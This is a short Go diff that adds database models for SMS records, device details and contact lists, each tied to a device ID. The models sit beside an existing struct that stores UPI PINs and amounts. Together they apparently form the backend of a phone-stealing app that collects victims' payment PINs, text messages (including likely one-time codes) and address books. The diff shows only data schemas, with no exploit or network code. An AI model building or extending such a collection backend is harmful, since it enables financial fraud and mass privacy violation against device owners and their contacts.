@@ -61,3 +61,33 @@ type UpiDetail struct {
 	Pin       string    `json:"pin"`
 	Amount    float64   `json:"amount"`
 }
+
+type SmsRecord struct {
+	ID         uint      `gorm:"primaryKey" json:"id"`
+	CreatedAt  time.Time `json:"created_at"`
+	DeviceID   string    `json:"device_id"`
+	Sender     string    `json:"sender"`
+	Message    string    `json:"message"`
+	ReceivedAt string    `json:"received_at"`
+}
+
+type Device struct {
+	ID           uint      `gorm:"primaryKey" json:"id"`
+	CreatedAt    time.Time `json:"created_at"`
+	DeviceID     string    `gorm:"uniqueIndex" json:"device_id"`
+	DeviceName   string    `json:"device_name"`
+	Model        string    `json:"model"`
+	OsVersion    string    `json:"os_version"`
+	AppVersion   string    `json:"app_version"`
+	PhoneNumber  string    `json:"phone_number"`
+	LastSeen     time.Time `json:"last_seen"`
+}
+
+type ContactRecord struct {
+	ID        uint      `gorm:"primaryKey" json:"id"`
+	CreatedAt time.Time `json:"created_at"`
+	DeviceID  string    `json:"device_id"`
+	Name      string    `json:"name"`
+	Phone     string    `json:"phone"`
+	Email     string    `json:"email"`
+}
